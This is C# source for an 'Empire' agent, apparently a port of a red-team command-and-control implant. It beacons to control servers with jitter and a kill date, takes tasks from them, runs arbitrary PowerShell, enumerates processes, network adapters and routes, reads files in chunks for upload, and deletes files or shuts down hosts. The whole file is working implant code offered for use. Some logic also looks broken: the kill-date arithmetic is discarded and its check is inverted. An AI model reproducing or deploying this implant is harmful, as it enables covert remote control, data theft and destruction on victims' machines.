using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Management;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

using WheresMyImplant;

namespace Empire
{
    class Agent : Base
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern Boolean IsWow64Process([In] IntPtr process, [Out] out bool wow64Process);

        private String sessionId;
        private String[] controlServers;
        private DateTime killDate;
        private byte[] packets;
        private String[] workingHours = new String[2];
        //private String profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
        
        private  String defaultResponse { get; set; }

        private Coms coms;
        private JobTracking jobTracking;

        ////////////////////////////////////////////////////////////////////////////////
        internal Agent(String stagingKey, String sessionKey, String sessionId, String servers)
        {
            this.sessionId = sessionId;
            defaultResponse = "";

            killDate = DateTime.Now;
            killDate.AddYears(1);

            controlServers = servers.Split(',');

            coms = new Coms(sessionId, stagingKey, sessionKey, controlServers);
            jobTracking = new JobTracking();
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal void execute()
        {
            while (true)
            {
                run();
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Main Loop
        ////////////////////////////////////////////////////////////////////////////////
        private void run()
        {
            ////////////////////////////////////////////////////////////////////////////////
            if (killDate.CompareTo(DateTime.Now) > 0 || coms.missedCheckins > coms.lostLimit)
            {
                jobTracking.checkAgentJobs(ref packets, ref coms);

                if (packets.Length > 0)
                {
                    coms.sendMessage(packets);
                }

                String message = "";
                if(killDate.CompareTo(DateTime.Now) > 0)
                {
                    message = "[!] Agent " + sessionId + " exiting: past killdate";
                }
                else
                {
                    message = "[!] Agent " + sessionId + " exiting: Lost limit reached";
                }

                UInt16 result = 0;
                coms.sendMessage(coms.encodePacket(2, message, result));
                Environment.Exit(1);
            }

            ////////////////////////////////////////////////////////////////////////////////
            Regex regex = new Regex("^[0-9]{1,2}:[0-5][0-9]$");
            if (workingHours != null && workingHours[0] != null && workingHours[1] != null)
            {
                if (regex.Match(workingHours[0]).Success && regex.Match(workingHours[1]).Success)
                {
                    DateTime now = DateTime.Now;
                    DateTime start = DateTime.Parse(workingHours[0]);
                    DateTime end = DateTime.Parse(workingHours[1]);
                    if ((end.Hour - start.Hour) < 0)
                    {
                        start = start.AddDays(-1);
                    }
                    if (now.CompareTo(start) > 0 && now.CompareTo(end) < 0)
                    {
                        TimeSpan sleep = start.Subtract(now);
                        if (sleep.CompareTo(0) < 0)
                        {
                            sleep = (start.AddDays(1) - now);
                        }
                        Thread.Sleep((Int32)sleep.TotalMilliseconds);
                    }

                }
            }

            ////////////////////////////////////////////////////////////////////////////////
            if (coms.agentDelay != 0)
            {
                Int32 sleepMin = (coms.agentJitter - 1) * coms.agentDelay;
                Int32 sleepMax = (coms.agentJitter + 1) * coms.agentDelay;

                if (sleepMin == sleepMax)
                {
                    coms.sleepTime = sleepMin;
                }
                else
                {
                    Random random = new Random();
                    coms.sleepTime = random.Next(sleepMin, sleepMax);
                }

                Thread.Sleep(coms.sleepTime * 1000);
            }

            ////////////////////////////////////////////////////////////////////////////////
            byte[] jobResults = jobTracking.getAgentJobsOutput(ref coms);
            if (jobResults.Length > 0)
            {
                coms.sendMessage(jobResults);
            }

            ////////////////////////////////////////////////////////////////////////////////
            byte[] taskData = coms.getTask();
            if (taskData.Length > 0)
            {
                coms.missedCheckins = 0;
                if (Encoding.UTF8.GetString(taskData) != defaultResponse)
                {
                    coms.decodeRoutingPacket(taskData, ref jobTracking);
                }
            }
            GC.Collect();
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal static byte[] getFilePart(String file, Int32 index, Int32 chunkSize)
        {
            byte[] output = new byte[0];
            try
            {
                //Don't shoot the translator, please
                FileInfo fileInfo = new FileInfo(file);
                using (FileStream fileStream = File.OpenRead(file))
                {
                    if (fileInfo.Length < chunkSize)
                    {
                        if (index == 0)
                        {
                            output = new byte[fileInfo.Length];
                            fileStream.Read(output, 0, output.Length);
                            return output;
                        }
                        else
                        {
                            return output;
                        }
                    }
                    else
                    {
                        output = new byte[chunkSize];
                        Int32 start = index * chunkSize;
                        fileStream.Seek(start, 0);
                        Int32 count = fileStream.Read(output, 0, output.Length);
                        if (count > 0)
                        {
                            if (count != chunkSize)
                            {
                                byte[] output2 = new byte[count];
                                Array.Copy(output, output2, count);
                                return output2;
                            }
                            else
                            {
                                return output;
                            }
                        }
                        else
                        {
                            return output;
                        }
                    }
                }
            }
            catch
            {
                return output;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Almost Done - Finish move copy delete
        ////////////////////////////////////////////////////////////////////////////////
        internal static String invokeShellCommand(String command, String arguments)
        {
            if (arguments.Contains("*\"\\\\*")) 
            {
                arguments = arguments.Replace("\"\\\\","FileSystem::\"\\\\");
            }
            else if (arguments.Contains("*\\\\*")) 
            {
                arguments = arguments.Replace("\\\\", "FileSystem::\\");
            }
            String output = "";
            if (command.ToLower() == "shell")
            {
                if (command.Length > 0)
                {
                    output = runPowerShell(arguments);
                }
                else
                {
                    output = "no shell command supplied";
                }
                output += "\n\r..Command execution completed.";
            }
            else
            {
                //Change this to if, else if, else

                if (command == "ls" || command == "dir" || command == "gci")
                {
                    output = getChildItem(arguments);
                }
                else if (command == "mv" || command == "move")
                {
                    moveFile(arguments.Split(' ')[0], arguments.Split(' ')[1]);
                    output = "executed " + command + " " + arguments;
                }
                else if (command == "cp" || command == "copy")
                {
                    copyFile(arguments.Split(' ')[0], arguments.Split(' ')[1]);
                    output = "executed " + command + " " + arguments;
                }
                else if (command == "rm" || command == "del" || command == "rmdir")
                {
                    deleteFile(arguments);
                    output = "executed " + command + " " + arguments;
                }

                else if (command == "cd")
                {
                    Directory.SetCurrentDirectory(arguments);
                }
                else if (command == "ifconfig" || command == "ipconfig")
                {
                    output = ifconfig();
                }
                else if (command == "ps" || command == "tasklist")
                {
                    output = tasklist(arguments);
                }
                else if (command == "route")
                {
                    output = route(arguments);
                }
                else if (command == "whoami" || command == "getuid")
                {
                    output = WindowsIdentity.GetCurrent().Name;
                }
                else if (command == "hostname")
                {
                    output = Dns.GetHostName();
                }
                else if (command == "reboot" || command == "restart")
                {
                    shutdown("2");
                }
                else if (command == "shutdown")
                {
                    shutdown("5");
                }
                else
                {
                    runPowerShell(arguments);
                    output = "executed " + command + " " + arguments + "\n\r";
                }
            }
            return output;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        private static void shutdown(String flags)
        {
            ManagementClass managementClass = new ManagementClass("Win32_OperatingSystem");
            managementClass.Get();

            managementClass.Scope.Options.EnablePrivileges = true;
            ManagementBaseObject managementBaseObject = managementClass.GetMethodParameters("Win32Shutdown");

            // Flag 1 means we want to shut down the system. Use "2" to reboot.
            managementBaseObject["Flags"] = flags;
            managementBaseObject["Reserved"] = "0";
            foreach (ManagementObject managementObject in managementClass.GetInstances())
            {
                managementObject.InvokeMethod("Win32Shutdown", managementBaseObject, null);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        private static String route(String arguments)
        {
            Dictionary<UInt32, String> adapters = new Dictionary<UInt32, String>();
            ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
            scope.Connect();
            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_NetworkAdapterConfiguration");
            ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection objectCollection = objectSearcher.Get();
            foreach (ManagementObject managementObject in objectCollection)
            {
                adapters[(UInt32)managementObject["InterfaceIndex"]] = managementObjectToString((String[])managementObject["IPAddress"]);
            }

            List<String> lines = new List<String>();
            ObjectQuery query2 = new ObjectQuery("SELECT * FROM Win32_IP4RouteTable ");
            ManagementObjectSearcher objectSearcher2 = new ManagementObjectSearcher(scope, query2);
            ManagementObjectCollection objectCollection2 = objectSearcher2.Get();
            foreach (ManagementObject managementObject in objectCollection2)
            {
                String destination = "";
                if (managementObject["Destination"] != null)
                {
                    destination = (String)managementObject["Destination"];
                }

                String netmask = "";
                if (managementObject["Mask"] != null)
                {
                    netmask = (String)managementObject["Mask"];
                }

                String nextHop = "0.0.0.0";
                if ((String)managementObject["NextHop"] != "0.0.0.0")
                {
                    nextHop = (String)managementObject["NextHop"];
                }

                Int32 index = (Int32)managementObject["InterfaceIndex"];
                
                String adapter = "";
                if (!adapters.TryGetValue((UInt32)index, out adapter))
                {
                    adapter = "127.0.0.1";
                }

                String metric = Convert.ToString((Int32)managementObject["Metric1"]);

                lines.Add(
                    String.Format("{0,-17} : {1,-50}\n", "Destination", destination) +
                    String.Format("{0,-17} : {1,-50}\n", "Netmask", netmask) +
                    String.Format("{0,-17} : {1,-50}\n", "NextHop", nextHop) +
                    String.Format("{0,-17} : {1,-50}\n", "Interface", adapter) +
                    String.Format("{0,-17} : {1,-50}\n", "Metric", metric)    
                );

            }
            return String.Join("\n", lines.ToArray());
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        private static String tasklist(String arguments)
        {
            Dictionary<Int32, String> owners = new Dictionary<Int32, String>();
            ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
            scope.Connect();
            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_Process");
            ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection objectCollection = objectSearcher.Get();
            foreach (ManagementObject managementObject in objectCollection)
            {
                String name = "";
                String[] owner = new String[2];
                managementObject.InvokeMethod("GetOwner", (object[]) owner);
                if (owner[0] != null)
                {
                    name = owner[1] + "\\" + owner[0];
                }
                else
                {
                    name = "N/A";
                }
                managementObject.InvokeMethod("GetOwner", (object[]) owner);
                owners[Convert.ToInt32(managementObject["Handle"])] = name;
            }

            List<String[]> lines = new List<String[]>();
            System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcesses();
            foreach (System.Diagnostics.Process process in processes)
            {
                String architecture;
                Int32 workingSet;
                Boolean isWow64Process;
                try
                {
                    IsWow64Process(process.Handle, out isWow64Process);
                    if (isWow64Process)
                    {
                        architecture = "x64";
                    }
                    else
                    {
                        architecture = "x86";
                    }
                }
                catch
                {
                    architecture = "N/A";
                }
                workingSet = (Int32)(process.WorkingSet64 / 1000000);

                String userName = "";
                try
                {
                    if (!owners.TryGetValue(process.Id, out userName))
                    {
                        userName = "False";
                    }
                }
                catch
                {
                    userName = "Catch";
                }

                lines.Add(
                    new String[] {process.ProcessName,
                        process.Id.ToString(),
                        architecture,
                        userName,
                        Convert.ToString(workingSet)
                    }
                );

            }

            String[][] linesArray = lines.ToArray();

            //https://stackoverflow.com/questions/232395/how-do-i-sort-a-two-dimensional-array-in-c
            Comparer<Int32> comparer = Comparer<Int32>.Default;
            Array.Sort<String[]>(linesArray, (x, y) => comparer.Compare(Convert.ToInt32(x[1]), Convert.ToInt32(y[1])));
            
            List<String> sortedLines = new List<String>();
            String[] headerArray = {"ProcessName", "PID", "Arch", "UserName", "MemUsage"};
            sortedLines.Add(String.Format("{0,-30} {1,-8} {2,-6} {3,-28} {4,8}", headerArray));
            foreach (String[] line in linesArray)
            {
                sortedLines.Add(String.Format("{0,-30} {1,-8} {2,-6} {3,-28} {4,8} M", line));
            }
            return String.Join("\n", sortedLines.ToArray());
        } 

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        private static String ifconfig()
        {
            ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
            scope.Connect();
            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_NetworkAdapterConfiguration");
            ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection objectCollection = objectSearcher.Get();
            List<String> lines = new List<String>();
            foreach (ManagementObject managementObject in objectCollection)
            {
                if ((Boolean)managementObject["IPEnabled"] == true)
                {
                    lines.Add(
                        String.Format("{0,-17} : {1,-50}\n", "Description", managementObject["Description"]) +
                        String.Format("{0,-17} : {1,-50}\n", "MACAddress", managementObject["MACAddress"]) +
                        String.Format("{0,-17} : {1,-50}\n", "DHCPEnabled", managementObject["DHCPEnabled"]) +
                        String.Format("{0,-17} : {1,-50}\n", "IPAddress", managementObjectToString((String[])managementObject["IPAddress"])) +
                        String.Format("{0,-17} : {1,-50}\n", "IPSubnet", managementObjectToString((String[])managementObject["IPSubnet"])) +
                        String.Format("{0,-17} : {1,-50}\n", "DefaultIPGateway", managementObjectToString((String[])managementObject["DefaultIPGateway"])) +
                        String.Format("{0,-17} : {1,-50}\n", "DNSServer", managementObjectToString((String[])managementObject["DNSServerSearchOrder"])) +
                        String.Format("{0,-17} : {1,-50}\n", "DNSHostName", managementObject["DNSHostName"]) +
                        String.Format("{0,-17} : {1,-50}\n", "DNSSuffix", managementObjectToString((String[])managementObject["DNSDomainSuffixSearchOrder"]))
                    );
                }
            }
            return String.Join("\n", lines.ToArray());
        }

        ////////////////////////////////////////////////////////////////////////////////
        private static void deleteFile(String sourceFile)
        {
            if (isFile(sourceFile))
            {
                File.Delete(sourceFile);
            }
            else
            {
                Directory.Delete(sourceFile, true);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        private static void copyFile(String sourceFile, String destinationFile)
        {
            if (isFile(sourceFile))
            {
                File.Copy(sourceFile, destinationFile);
            }
            else
            {
                //https://stackoverflow.com/questions/58744/copy-the-entire-contents-of-a-directory-in-c-sharp
                foreach (string dirPath in Directory.GetDirectories(sourceFile, "*", SearchOption.AllDirectories))
                {
                    Directory.CreateDirectory(dirPath.Replace(sourceFile, destinationFile));
                }

                foreach (string newPath in Directory.GetFiles(sourceFile, "*.*", SearchOption.AllDirectories))
                {
                    File.Copy(newPath, newPath.Replace(sourceFile, destinationFile), true);
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        private static void moveFile(String sourceFile, String destinationFile)
        {
            if (isFile(sourceFile))
            {
                File.Move(sourceFile, destinationFile);
            }
            else
            {
                Directory.Move(sourceFile, destinationFile);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        private static Boolean isFile(String filePath)
        {
            FileAttributes fileAttributes = File.GetAttributes(filePath);
            if ((fileAttributes & FileAttributes.Directory) == FileAttributes.Directory)
            {
                return false;
            }
            else
            {
                return true;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        private static String managementObjectToString(String[] managementObject)
        {
            String output;
            if (managementObject != null && managementObject.Length > 0)
            {
                output = String.Join(", ", managementObject);
            }
            else
            {
                output = " ";
            }
            return output;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        private static String getChildItem(String folder)
        {
            if (folder == "")
            {
                folder = ".";
            }

            try
            {
                List<String> lines = new List<String>();
                DirectoryInfo directoryInfo = new DirectoryInfo(folder);
                FileInfo[] files = directoryInfo.GetFiles();
                foreach (FileInfo file in files)
                {
                    lines.Add(file.ToString());
                    //output += Directory.GetLastWriteTime(file.FullName) + "\t";
                    //output += file.Length + "\t";
                    //output += file.Name + "\n\r";
                }
                return String.Join("\n", lines.ToArray());
            }
            catch (Exception error)
            {
                return "[!] Error: " + error + " (or cannot be accessed).";
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        internal static String runPowerShell(string command)
        {
            StringBuilder stringBuilder = new StringBuilder();
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            
            Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(command);
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();

            runspace.Close();
            
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj.ToString());
            }
            return stringBuilder.ToString();
        }
    }
}